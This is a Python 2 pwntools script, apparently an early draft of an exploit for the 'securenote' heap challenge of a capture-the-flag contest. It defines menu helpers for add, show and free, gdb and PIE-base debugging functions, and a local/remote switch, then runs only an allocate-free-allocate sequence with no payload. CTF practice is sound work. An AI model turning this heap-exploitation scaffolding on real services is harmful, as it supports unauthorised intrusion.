#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './main'
HOST, PORT = 'securenote.balsnctf.com', 5454

elf = ELF('./main')
p = process('./main')
libc = ELF('./libc.so.6')

# Credits to teamrocketist for the following two functions, they help immensely when trying
# to debug exploits
def get_base_address(proc):
  return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
  script = ""
  PIE = get_base_address(p)
  for bp in breakpoints:
    script += "b *0x%x\n"%(PIE+bp)
  gdb.attach(p,gdbscript=script)

def add(idx, content):
    p.sendlineafter(': ', '0')
    p.sendlineafter(': ', str(idx))
    p.recv()
    p.send(content)

def show(idx):
    p.sendlineafter(': ', '1')
    p.sendlineafter(': ', str(idx))
    return p.recvline()

def free(idx):
    p.sendlineafter(': ', '2')
    p.sendlineafter(': ', str(idx))

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

add(0, 'A'*0x3e7)
add(1, 'A'*0x3e7)
free(0)
add(0, 'A'*0x3e7)

p.interactive()
